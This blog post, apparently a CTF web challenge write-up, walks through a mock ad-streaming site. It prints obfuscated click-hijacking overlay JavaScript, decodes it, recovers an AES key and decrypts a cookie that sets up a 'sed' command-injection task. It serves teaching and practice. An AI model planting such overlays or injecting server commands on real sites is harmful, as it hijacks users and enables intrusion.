---
layout: post
title:  "BhAcKAri Streaming Service"
date:   2026-06-03 05:46:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /bhackari-CTF-2026-BhAcKAri-Streaming-Service/
---

**Title**: BhAcKAri Streaming Service

**Category**: web

**Author**: @Ronny

**Description**: Pwning all day can be really exhausting, sometimes you just need some break to watch your favourite anime series! And- oh! Don’t worry about all those ads, we’re definitely not doing anything shady (˵ •̀ ᴗ - ˵ ) ✧ Website: [http://streaming.challs.ctf.bhackari.it:8000](http://streaming.challs.ctf.bhackari.it:8000)

I go to the site:

![Alt text](/images/bhackariweb1.png)

If I click on anything I am redirected and a new tab is opened. First it makes a POST request to `:5687` with a cookie called `payload`:
```http
POST / HTTP/1.1
Host: streaming.challs.ctf.bhackari.it:5687
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://streaming.challs.ctf.bhackari.it:8000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://streaming.challs.ctf.bhackari.it:8000
DNT: 1
Connection: keep-alive
Cookie: payload=8724c6792e7393762199d1728f5982adb8c0dc1a1442c4a2143d2ce00abfc573d3f62220835420dab78b90f151288109c7094821764c6eddf0f26bac916d5e51f0314873fd76f44377d02b2859b9fe81b2b4f088280b85f75db68163a402aa33ee2f6fdcd68591232d1d2d4fb343ec855022bb572a571403f545525ac1b7fb2107d3b991c4f74b569653f568fdf15184a557aaf1cbd9dc8b34678748f8c1fdc104848a02a8c0f9f790cc67e7dd5a6db595f6380ae4c2e5a443dab114130677b687b8fd96de8bf2c853f2924602850efadaa9efb4b9151b04db0baf93eefa40d2e6c5ba288a2a90602ee61b224f1209d50013ab137c00c641352d980a41196b6141bf9b82af7f363c4d6c86dedd9b6866ebf6644b319869e8254f7d4e5a1a1f2f7aa1a1558a3d38e2f8b5c047f72beee67c7fbf3dc2a49310a4ac7ec712c9b8109fc0a76edf5915ee4209239d664262b4f24c7e986396c86a7112f5a762a75d0b8e2a34591706a39dfd10b818983f84302d8804cd85e8a302406868124b316e7aa5d25f71c2f97240f213f3ff6357e372b2abbfaa4110b9b1d919b3be3a7d272daf876130068db5bb1bc65f32a5658db58bf2ed3e2b5812e5e8899bfad6d448b31e52a946b790443cd4e86d27635dc22626586287615f6845f1a1ac638f4b6fb42340dfa902961d55371a0d083f33ecc8
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response:
```http
HTTP/1.0 303 See Other
Server: BaseHTTP/0.6 Python/3.11.15
Date: Sun, 31 May 2026 07:29:54 GMT
Location: /ads
Content-Type: text/plain; charset=utf-8

Blocked sed options

               ⣤⡶⠛⣉⣋⠛⠻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⡟⠀⣾⣿⣿⣿⠀⢻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⣷⡀⣘⡿⣷⠟⢀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     
              ⠿⠟⠿⣽⡇⢰⣟⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⣀⣤⣤⣤⣴⡦⠀      
              ⠀⠀⠀⣸⣇⣸⣯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣦⣤⣤⣄⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠀⡾⠋⣡⣤⣧⡈⠹⡗     
              ⠀⠀⠀⣷⡏⠀⢹⣷⠀⠀⠀⠀⢀⣠⣴⣾⣿⠿⠶⠞⢛⣫⣭⣭⣝⣽⣿⣿⣿⣿⣻⡛⢦⣄⡀⠀⠀⠀⠀⠀ ⠀⢨⣅⠀⣿⣾⣟⡿⠀⣹     
               ⠀⠀⠀⠓⠛⠷⠟⠿⠀⠀⣤⣾⣿⠷⠛⠁⠀⣠⣴⣾⠿⠛⠛⠿⠛⠉⠉⠉⠙⠋⠙⠛⠷⣮⣳⣆⡀⠀⠀⠀⠀⠀⠉⢿⡯⠟⠛⢁⣠⡟     
               ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⡿⠋⠀⠀⠀⣰⣾⠿⠋⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠙⣦⠀⠀⠀⠙⢮⡿⣄⠀⠀⠀⠀⣤⣾⠁⣴⢾⡿⠟⠀     
               ⠀⠀⠀⠀⠀⠀⢀⣼⣷⠏⠀⠤⠈⢀⣾⡿⠋⠀⠀⠀⠀⢸⡃⠀⠈⠀⡀⠀⠠⠀⠸⣇⠀⠀⠀⠀⢻⣞⢧⡀⠀⢸⡷⠛⢶⣿⡛⠀⠀⠀     
               ⠀⠀⠀⠀⠀⢀⣾⣳⠏⠀⢀⠂⢀⣿⡟⠀⢀⡄⠀⠀⢀⣿⠀⠀⠀⢰⠇⠀⠐⠀⠀⣿⡀⠀⠀⢳⡀⠹⣏⣷⠀⢚⣷⣀⣤⡿⠁⠀⠀⠀     
               ⠀⠀⠀⠀⠀⢸⣿⡟⠀⢈⠀⠀⣼⡟⠀⠀⣇⠀⠰⠚⢛⡯⠁⠐⠀⢸⠆⠀⠈⠀⠀⢹⡏⠑⠀⠈⣷⠀⢹⣟⡇⠀⠉⠉⠁⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⠀⣿⣿⠃⠀⢂⠀⢠⣿⠁⠀⠐⣿⠀⠀⠀⣾⡇⠀⠐⠀⣹⠆⠃⠈⠀⢠⡞⣷⠀⠀⠀⢿⡀⠈⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⢀⣿⣿⠀⡀⠂⠄⣸⡿⠀⠀⢈⣿⠀⠀⠀⣿⣗⠀⢀⠀⣽⡆⠁⠀⠀⢰⣏⣿⡃⠀⠀⢸⡇⠀⣻⣽⣧⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⢸⡏⣟⠀⠠⢁⠢⢸⡏⠀⠁⢈⣷⠀⠀⠐⣿⣿⠀⠀⠀⣿⡇⣶⠀⠀⢸⣧⣟⣇⠀⠀⣿⡇⢠⡜⣧⢿⡀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⣸⣷⣏⠀⣷⠛⠀⣿⡇⠀⠀⢈⣿⣀⣠⣴⣿⣿⣻⣤⡴⣿⣧⡿⣤⢦⣾⣷⣿⣿⣶⣶⣿⡇⠈⣿⡹⣯⣇⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⣽⣽⠃⢰⡏⠁⣸⣿⡇⠀⡀⠠⣿⣿⣿⣿⣿⣿⣿⣍⠁⠀⠀⠀⠀⠀⣹⣿⣿⣷⣬⡽⢿⡇⠀⣹⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⣼⣿⡟⠀⣾⠃⢀⣾⣿⣿⠀⡁⠀⣿⠀⢻⣿⣿⣾⣿⣿⠀⠀⠀⠄⠀⠀⢸⣿⣿⣿⣿⠇⣿⠀⣷⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⣿⣹⠀⢰⣿⠀⢨⣟⡿⣽⡆⠀⡀⢿⡀⠈⠻⠾⣽⠟⠃⠀⠀⠀⠀⡁⠀⠀⠙⠛⠋⠁⡘⣷⠀⢿⣿⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⣿⣿⠀⢸⡿⡀⠈⡿⣷⢸⡇⢻⡄⢺⡅⠐⢄⢠⠀⢀⠀⠈⠀⠈⠀⠀⠈⠀⠄⢂⠂⡑⠀⣿⠆⣻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⣿⣽⡆⠘⣿⣷⡀⢱⠻⣦⣟⠸⣇⠼⣇⠈⠄⠠⠈⠀⡀⠄⠀⠄⠀⠄⢀⠁⠠⠀⠀⣀⣴⡟⠡⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠈⢳⣹⣆⡹⣶⢋⡔⢣⢜⣻⣎⣿⢀⢿⣄⣀⠀⠁⠀⠀⠀⠀⠀⡄⠀⠀⣀⣠⣤⡶⣿⡏⢄⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⠀⢹⣯⢻⣯⣷⣬⣃⢾⡣⢿⣞⣧⢚⣿⠛⠻⠿⢶⣶⣶⣶⣶⣾⢿⣛⠻⣭⣓⣶⣿⡇⢎⣿⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⠀⠘⢻⣿⣬⣿⣿⣿⣿⣾⡿⣯⢿⣏⣿⡌⠱⢌⠆⡆⣌⣩⠳⠙⢷⣾⣿⣻⢿⣿⣾⣙⢾⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⠀⠀⡨⢒⣹⣿⣿⣿⣿⡿⢃⣽⣿⡿⣿⣞⣷⠯⠶⡼⣴⣤⣤⣤⣤⠾⣿⣿⣿⡿⣯⣿⣼⣿⣿⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     
               ⠀⠀⠀⣀⡀⢠⡾⢿⣯⣿⣿⣧⣸⣿⣯⣿⠁⠀⠉⠉⠀⢀⣀⣀⣀⣠⣀⠀⠀⠙⢿⣶⣟⣿⣿⣾⣶⣟⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

Then it makes a GET request to `http://streaming.challs.ctf.bhackari.it:5687/ads` and completes the redirection:

![Alt text](/images/bhackariweb2.png)

When looking at `view-source:http://streaming.challs.ctf.bhackari.it:8000/` I find some obfuscated javascript:
```html
<script>
  (function(Z, W, D, N) {
    let Pr = Z.nl;
    let Sr = Z.f;
    let Tr = Z.nl;
    let mr = Z.EI;
    let Fr = Z.YI;
    let Snr = Z.SI;
    let pOr = Z.nl;
    let pIr = Z.nl;
    let gPr = Z.f;
    const vo = "YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,";
    const Eo = [".", "%", "{"];

    function Ir(n) {
      if (Pr && D[Z.cn](Pr)) {
        return
      }
      D[Z.ckz] = Z.pld + "=" + "8724c6792e7393762199d1728f5982adb8c0dc1a1442c4a2143d2ce00abfc573d3f62220835420dab78b90f151288109c7094821764c6eddf0f26bac916d5e51f0314873fd76f44377d02b2859b9fe81b2b4f088280b85f75db68163a402aa33ee2f6fdcd68591232d1d2d4fb343ec855022bb572a571403f545525ac1b7fb2107d3b991c4f74b569653f568fdf15184a557aaf1cbd9dc8b34678748f8c1fdc104848a02a8c0f9f790cc67e7dd5a6db595f6380ae4c2e5a443dab114130677b687b8fd96de8bf2c853f2924602850efadaa9efb4b9151b04db0baf93eefa40d2e6c5ba288a2a90602ee61b224f1209d50013ab137c00c641352d980a41196b6141bf9b82af7f363c4d6c86dedd9b6866ebf6644b319869e8254f7d4e5a1a1f2f7aa1a1558a3d38e2f8b5c047f72beee67c7fbf3dc2a49310a4ac7ec712c9b8109fc0a76edf5915ee4209239d664262b4f24c7e986396c86a7112f5a762a75d0b8e2a34591706a39dfd10b818983f84302d8804cd85e8a302406868124b316e7aa5d25f71c2f97240f213f3ff6357e372b2abbfaa4110b9b1d919b3be3a7d272daf876130068db5bb1bc65f32a5658db58bf2ed3e2b5812e5e8899bfad6d448b31e52a946b790443cd4e86d27635dc22626586287615f6845f1a1ac638f4b6fb42340dfa902961d55371a0d083f33ecc8";
      Pr = D[Z.cE](Z.dv);
      Pr[Z.cN] = Gr();
      Pr[Z.st][Z.ps] = Z.fx;
      Pr[Z.st][Z.tp] = Z.C;
      Pr[Z.st][Z.lf] = Z.C;
      Pr[Z.st][Z.rt] = Z.C;
      Pr[Z.st][Z.bt] = Z.C;
      Pr[Z.st][Z.wd] = Z.hp;
      Pr[Z.st][Z.ht] = Z.hp;
      Pr[Z.st][Z.zI] = Z.mxZ;
      Pr[Z.st][Z.pE] = Z.nn;
      let inr = D[Z.cE](Z.dv);
      inr[Z.st][Z.br] = Z.nn;
      inr[Z.st][Z.ps] = Z.ab;
      inr[Z.st][Z.tp] = Z.C;
      inr[Z.st][Z.lf] = Z.C;
      inr[Z.st][Z.rt] = Z.C;
      inr[Z.st][Z.bt] = Z.C;
      inr[Z.st][Z.wd] = Z.hp;
      inr[Z.st][Z.ht] = Z.hp;
      inr[Z.st][Z.zI] = Z.mxZ;
      inr[Z.st][Z.pE] = Z.at;
      Pr[Z.aC](inr);
      Tr = function(evt) {
        if (Sr) return;
        Sr = Z.t;
        evt[Z.pD]();
        gPr = Z.t;
        Qr();
        let rUrl = Z.hs + Z.sl + Snr;
        let frm = D[Z.cE](Z.fm);
        frm[Z.mt] = Z.GT;
        frm[Z.ac] = rUrl;
        frm[Z.tg] = Z.bl;
        frm[Z.st][Z.dp] = Z.nn;
        D[Z.bd][Z.aC](frm);
        frm[Z.sb]();
        D[Z.bd][Z.rC](frm);
        W[Z.sT](() => {
          gPr = Z.f;
          Sr = Z.f;
          Ir(n)
        }, Z.CI)
      };
      Nr(inr, Tr);
      if (D[Z.bd]) {
        D[Z.bd][Z.aC](Pr)
      } else {
        D[Z.dE][Z.aC](Pr)
      }
      Sr = Z.f;
      sPr(n);
      uDr()
    }

    function Fe(e) {
      let t = Z.E,
        r = Z.G;
      for (let i = Z.g; i < e[Z.ln]; i++) {
        let a = Z.vo[Z.io](e[i]);
        if (Z.Eo[Z.io](e[i]) > -Z.G && Z.Eo[Z.io](e[i]) === Z.g) r = Z.g;
        if (a > -Z.G) {
          t += Z.Sf[Z.fc](r * Z.vo[Z.ln] + a);
          r = Z.G
        }
      }
      return t
    }

    function sPr(zId) {
      if (pOr) {
        pOr[Z.dc]()
      }
      pOr = new W[Z.MO](mts => {
        if (gPr) return;
        mts[Z.fE](mt => {
          if (mt[Z.rN][Z.ln] > Z.g) {
            Z.Ar[Z.fr](mt[Z.rN])[Z.fE](nd => {
              if (nd === Pr || Pr && nd === Pr[Z.fC] || nd[Z.cL] && Pr && nd[Z.cL][Z.cn](Pr[Z.cN])) {
                Pr = Z.nl;
                W[Z.sT](() => Ir(zId), Z.fy)
              }
            })
          }
        })
      });
      pOr[Z.ob](D[Z.dE], {
        childList: Z.t,
        subtree: Z.t
      });
      if (pIr) {
        W[Z.cI](pIr)
      }
      pIr = W[Z.sI](() => {
        if (gPr) return;
        if (!Pr || !D[Z.cn](Pr)) {
          Pr = Z.nl;
          Ir(zId)
        } else if (!Pr[Z.fC] || !D[Z.cn](Pr[Z.fC])) {
          Pr = Z.nl;
          Ir(zId)
        } else {
          const inr = Pr[Z.fC];
          if (inr[Z.st][Z.pE] !== Z.at) {
            inr[Z.st][Z.pE] = Z.at
          }
          if (inr[Z.st][Z.zI] !== Z.mxZ) {
            inr[Z.st][Z.zI] = Z.mxZ
          }
          uDr()
        }
      }, Z.ih);
      W[Z.aEL](Z.rs, uDr);
      W[Z.aEL](Z.sc, uDr);
      if (typeof W[Z.BC] !== Z.ud) {
        try {
          const bc = new W[Z.BC](Z.moc);
          bc[Z.om] = ev => {
            if (gPr) return;
            if (ev[Z.dt] === Z.rc) {
              if (!Pr || !D[Z.cn](Pr) || !Pr[Z.fC] || !D[Z.cn](Pr[Z.fC])) {
                Pr = Z.nl;
                Ir(zId)
              }
            }
          };
          W[Z.sI](() => {
            bc[Z.pm](Z.rc)
          }, Z.fh)
        } catch (e) {}
      }
    }

    function uDr() {
      if (!Pr || !D[Z.cn](Pr)) return;
      const w = Z.Mx[Z.ap](D[Z.dE][Z.sW], D[Z.dE][Z.cW], W[Z.iW] || Z.g);
      const h = Z.Mx[Z.ap](D[Z.dE][Z.sH], D[Z.dE][Z.cH], W[Z.iH] || Z.g);
      Pr[Z.st][Z.wd] = w + Z.px;
      Pr[Z.st][Z.ht] = h + Z.px;
      const inr = Pr[Z.fC];
      if (inr) {
        inr[Z.st][Z.wd] = w + Z.px;
        inr[Z.st][Z.ht] = h + Z.px
      }
    }

    function Qr() {
      try {
        if (Tr && Pr) {
          const evs = [Z.md, Z.ck, Z.mu, Z.te, Z.ts];
          evs[Z.fE](et => {
            Pr[Z.rEL](et, Tr, Z.t);
            if (Pr[Z.fC]) {
              Pr[Z.fC][Z.rEL](et, Tr, Z.t)
            }
          })
        }
        if (Pr && Pr[Z.pN]) {
          Pr[Z.pN][Z.rC](Pr)
        }
        Pr = Z.nl;
        Tr = Z.nl
      } catch (e) {}
    }

    function Nr(el, hd) {
      const evs = [Z.md, Z.ck, Z.mu, Z.te, Z.tst];
      const ua = N[Z.uA];
      const isCh = Z.Rg(Z.Ch, Z.E)[Z.ts](ua);
      const chV = isCh ? parseInt(ua[Z.mh](Z.Rg(Z.Ch, Z.E))[Z.G]) : Z.g;
      const isIOS = Z.Rg(Z.iOS, Z.E)[Z.ts](ua);
      const isAnd = Z.Rg(Z.And, Z.Zi)[Z.ts](ua);
      const isAF = Z.Rg(Z.And, Z.Zi)[Z.ts](ua) && Z.Rg(Z.Ffx, Z.Zi)[Z.ts](ua);
      const hasOCB = !isAF && chV < Z.fi;
      if (el[Z.aEL]) {
        if (isIOS) {
          el[Z.aEL](Z.ck, hd, Z.t);
          el[Z.aEL](Z.mu, hd, Z.t);
          if (hasOCB) el[Z.aEL](Z.te, hd, Z.t)
        } else if (isAnd) {
          el[Z.aEL](Z.ck, hd, Z.t);
          el[Z.aEL](Z.mu, hd, Z.t);
          if (hasOCB) el[Z.aEL](Z.ts, hd, Z.t)
        } else {
          evs[Z.fE](et => {
            el[Z.aEL](et, hd, Z.t)
          })
        }
      } else if (el[Z.aE]) {
        el[Z.aE](Z.oc, hd)
      }
    }

    function Gr() {
      const chs = Z.az;
      let res = Z.cp;
      for (let i = Z.g; i < Z.ei; i++) {
        res += chs[Z.cA](Z.Mx[Z.fl](Z.Mx[Z.rd]() * chs[Z.ln]))
      }
      return res
    }
    if (D[Z.rS] === Z.ld) {
      D[Z.aEL](Z.DC, () => {
        Ir(mr)
      })
    } else {
      Ir(mr)
    }
    W[Z.CD] = {
      rO: Qr,
      cO: () => Ir(mr),
      gO: () => Pr,
      rF: () => {
        Sr = Z.f
      }
    }
  })(Object.entries({
    g: 0,
    t: true,
    f: false,
    E: "",
    C: "0",
    G: "1",
    EI: 10,
    YI: 5,
    CI: 2e3,
    fy: 50,
    ih: 100,
    fh: 500,
    ei: 8,
    fi: 56,
    mxZ: "2147483647",
    android: "ylbpmgb",
    nl: null,
    SI: "efdqmyuzs.otmxxe.ofr.ntmowmdu.uf:5687",
    hp: "100%",
    fx: "rujqp",
    ab: "mneaxgfq",
    nn: "zazq",
    at: "mgfa",
    dv: "puh",
    fm: "rady",
    GT: "BAEF",
    bl: "_nxmzw",
    qd: "?pahd=fdgq",
    cf: "/mpe",
    sl: "//",
    hs: "tffb:",
    cp: "ofr-",
    az: "mnopqrstuvwxyzabcdefghijkl",
    ud: "gzpqruzqp",
    rc: "dqodqmfq",
    moc: "ymximdq_ahqdxmk_otmzzqx",
    px: "bj",
    ld: "xampuzs",
    cn: "oazfmuze",
    cE: "odqmfqQxqyqzf",
    cN: "oxmeeZmyq",
    st: "efkxq",
    ps: "baeufuaz",
    tp: "fab",
    lf: "xqrf",
    rt: "dustf",
    bt: "naffay",
    wd: "iupft",
    ht: "tqustf",
    zI: "lUzpqj",
    pE: "bauzfqdQhqzfe",
    br: "nadpqd",
    aC: "mbbqzpOtuxp",
    pD: "bdqhqzfPqrmgxf",
    bd: "napk",
    dE: "paogyqzfQxqyqzf",
    mt: "yqftap",
    ac: "mofuaz",
    tg: "fmdsqf",
    dp: "puebxmk",
    sb: "egnyuf",
    rC: "dqyahqOtuxp",
    sT: "eqfFuyqagf",
    dc: "pueoazzqof",
    MO: "YgfmfuazAneqdhqd",
    fE: "radQmot",
    rN: "dqyahqpZapqe",
    ln: "xqzsft",
    Ar: "Mddmk",
    fr: "rday",
    fC: "rudefOtuxp",
    cL: "oxmeeXuef",
    ob: "aneqdhq",
    cI: "oxqmdUzfqdhmx",
    sI: "eqfUzfqdhmx",
    aEL: "mppQhqzfXuefqzqd",
    rs: "dqeulq",
    sc: "eodaxx",
    BC: "NdampomefOtmzzqx",
    om: "azyqeemsq",
    dt: "pmfm",
    pm: "baefYqeemsq",
    Mx: Math,
    ap: "ymj",
    sW: "eodaxxIupft",
    cW: "oxuqzfIupft",
    iW: "uzzqdIupft",
    sH: "eodaxxTqustf",
    cH: "oxuqzfTqustf",
    iH: "uzzqdTqustf",
    rEL: "dqyahqQhqzfXuefqzqd",
    pN: "bmdqzfZapq",
    md: "yageqpaiz",
    ck: "oxuow",
    mu: "yageqgb",
    te: "fagotqzp",
    tst: "fagotefmdf",
    ts: "fqef",
    uA: "geqdMsqzf",
    mh: "ymfot",
    aE: "mffmotQhqzf",
    oc: "azoxuow",
    cA: "otmdMf",
    fl: "rxaad",
    rd: "dmzpay",
    pzi: "19734r90mm767612380m183mp9n4o56827n9p7n379q3n71o6r3812qq2mq42r4nm235o4r2p38qpn6m75pn5r3221027m1q739no475q08q3nmr4nopmr449890qrpr102m2m6m5332oqo923pp3rmp91103p17q059q19n80n302p15p61o28pq90r85q9q761np6o960q4mn947or8517no4oq97nrrmo323q5n114m9om8p79",
    rS: "dqmpkEfmfq",
    pld: "bmkxamp",
    DC: "PAYOazfqzfXampqp",
    CD: "OFR_PQNGS",
    Rg: function(p, f) {
      return new RegExp(p, f)
    },
    Ch: "Otdayq\\/([0-9]{1,})",
    iOS: "uBtazq|uBmp|uBap",
    And: "mzpdaup",
    Ffx: "rudqraj",
    Zi: "u",
    vo: "KlD(ht&qwK7d-]ekI5=9xT^3cE~YiQalM*6#:u}ZNfSobH1)4F_0yvGA[jCVgO2zpB!JU/XPR@8rnKeym,",
    Eo: [".", "%", "{"],
    io: "uzpqjAr",
    Sf: "Efduzs",
    fc: "rdayOtmdOapq",
    ckz: "oaawuq"
  }).reduce((a, i) => {
    Object.defineProperty(a, i[0], {
      get: () => typeof i[1] !== "string" ? i[1] : i[1].split("").map(s => {
        const c = s.charCodeAt(0);
        return c >= 65 && c <= 90 ? String.fromCharCode((c - 65 + 14) % 26 + 65) : c >= 97 && c <= 122 ? String.fromCharCode((c - 97 + 14) % 26 + 97) : s
      }).join("")
    });
    return a
  }, {}), window, document, navigator); /*This is for you Arturo*/
  "c.7.*.*.*.*.#9l#=6qZ:qoE.#.J.*.#.P6:i6o.V.*wt.*H6qlE9.V.*Mq#:lE.*3l6l.V.*:3q#.*q#.*:3l.*MW#:.*:qwl.*toi.*Ho6^l:.*:3l.*~lt.V.*Nl.*=WE.B:.*WHHo69.*:o.*Mo#l.*WMM.*:3l.*9W:W#.*Nl.*=oMMl=:l9.*#o.*HW6.*H6ow.*i#l6.*.X.a.a.f.@./R.#.7.*.*.*.*.#WM^o.#.J.*.#.P./R.0.U.O.#.V.7.*.*.*.*.#~lt.1iH:.1.x.#.J.*.#qE#3WMMW3sEo5o9tsNqMMs#:lWMs:3q#.#.7.*.*.*.*.#.@h.#.J.*.#.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.#.V.7.*.*.*.*.#.|o9l.#.J.*.#.X.!.X.#.7V";
</script>
```

Some of the obfuscation is simply done with `ROT14`. A ciphertext is hardcoded directly in the `Ir` function. To decode the custom encoding, each character in the encoded string is looked up in the custom alphabet:
```shell
YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,
```

A shift register starts at 1. If a `.` is seen, the register drops to 0. The next alphabet character found emits: `chr(shift_register * len(ALPHABET) + alphabet_index)`, then resets the register resets to 1:
```python
# custom alphabet used for character lookup
ALPHABET = "YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,"

# characters that affect the shift register
SHIFT_RESET_CHARS = [".", "%", "{"]

def decode_custom_encoding(encoded_string: str) -> str:
    result = []
    shift_register = 1  # starts as Z.G = 1
    alphabet_length = len(ALPHABET)

    for char in encoded_string:
        index_in_alphabet = ALPHABET.find(char)

        # a dot resets the shift register to 0
        if char == SHIFT_RESET_CHARS[0]:
            shift_register = 0

        # if the character exists in the alphabet emit the decoded character
        if index_in_alphabet != -1:
            decoded_char = chr(shift_register * alphabet_length + index_in_alphabet)
            result.append(decoded_char)
            shift_register = 1  # reset back to 1 after each decoded char

    return "".join(result)

encoded_payload = (
    "c.7.*.*.*.*.#9l#=6qZ:qoE.#.J.*.#.P6:i6o.V.*wt.*H6qlE9.V.*Mq#:lE.*3l6l.V.*:3q#.*q#.*:3l.*MW#:.*:qwl.*toi.*Ho6^l:.*:3l.*~lt.V.*Nl.*=WE.B:.*WHHo69.*:o.*Mo#l.*WMM.*:3l.*9W:W#.*Nl.*=oMMl=:l9.*#o.*HW6.*H6ow.*i#l6.*.X.a.a.f.@./R.#.7.*.*.*.*.#WM^o.#.J.*.#.P./R.0.U.O.#.V.7.*.*.*.*.#~lt.1iH:.1.x.#.J.*.#qE#3WMMW3sEo5o9tsNqMMs#:lWMs:3q#.#.7.*.*.*.*.#.@h.#.J.*.#.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.T.#.V.7.*.*.*.*.#.|o9l.#.J.*.#.X.!.X.#.7V"
)

decoded_message = decode_custom_encoding(encoded_payload)
```

Output:
```shell
python3 solve.py  
{  
	"description": "Arturo, my friend, listen here, this is the last time you forget the key, we can't afford to lose all the datas we collected so far from user COOKIES"  
	"algo": "AES256",  
	"key-uft-8": "inshallah_nobody_will_steal_this"  
	"IV": "00000000000000000000000000000000",  
	"Mode": "CBC"  
}
```

The cookies are encrypted with `AES-256-CBC`. The key is `inshallah_nobody_will_steal_this` and the IV is `00000000000000000000000000000000`. There is a hardcoded cookie in the JS which I decrypt to get this message:
```shell
{
    "cmd": "sed --help",
    "message": "listen Arturo I don't care about your family starving, this is the command to write the stolen datas on our logs. It doesn't work because I wanted to enchance security and made the server accept only sed commands with letters and {' ', '-', '?'}. FIX IT. Oh, and DONT EVEN TRY to touch my flag.txt I blocked the world flag so KEEP OFF",
	"location": "IT",
    "zoneId": 8604706,
    "stolen_datas": "bla bla bla",
    "stolen_datas_2": "bla bla bla"
}

```

[decrypting cookie cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'inshallah_nobody_will_steal_this'%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=ODcyNGM2NzkyZTczOTM3NjIxOTlkMTcyOGY1OTgyYWRiOGMwZGMxYTE0NDJjNGEyMTQzZDJjZTAwYWJmYzU3M2QzZjYyMjIwODM1NDIwZGFiNzhiOTBmMTUxMjg4MTA5YzcwOTQ4MjE3NjRjNmVkZGYwZjI2YmFjOTE2ZDVlNTFmMDMxNDg3M2ZkNzZmNDQzNzdkMDJiMjg1OWI5ZmU4MWIyYjRmMDg4MjgwYjg1Zjc1ZGI2ODE2M2E0MDJhYTMzZWUyZjZmZGNkNjg1OTEyMzJkMWQyZDRmYjM0M2VjODU1MDIyYmI1NzJhNTcxNDAzZjU0NTUyNWFjMWI3ZmIyMTA3ZDNiOTkxYzRmNzRiNTY5NjUzZjU2OGZkZjE1MTg0YTU1N2FhZjFjYmQ5ZGM4YjM0Njc4NzQ4ZjhjMWZkYzEwNDg0OGEwMmE4YzBmOWY3OTBjYzY3ZTdkZDVhNmRiNTk1ZjYzODBhZTRjMmU1YTQ0M2RhYjExNDEzMDY3N2I2ODdiOGZkOTZkZThiZjJjODUzZjI5MjQ2MDI4NTBlZmFkYWE5ZWZiNGI5MTUxYjA0ZGIwYmFmOTNlZWZhNDBkMmU2YzViYTI4OGEyYTkwNjAyZWU2MWIyMjRmMTIwOWQ1MDAxM2FiMTM3YzAwYzY0MTM1MmQ5ODBhNDExOTZiNjE0MWJmOWI4MmFmN2YzNjNjNGQ2Yzg2ZGVkZDliNjg2NmViZjY2NDRiMzE5ODY5ZTgyNTRmN2Q0ZTVhMWExZjJmN2FhMWExNTU4YTNkMzhlMmY4YjVjMDQ3ZjcyYmVlZTY3YzdmYmYzZGMyYTQ5MzEwYTRhYzdlYzcxMmM5YjgxMDlmYzBhNzZlZGY1OTE1ZWU0MjA5MjM5ZDY2NDI2MmI0ZjI0YzdlOTg2Mzk2Yzg2YTcxMTJmNWE3NjJhNzVkMGI4ZTJhMzQ1OTE3MDZhMzlkZmQxMGI4MT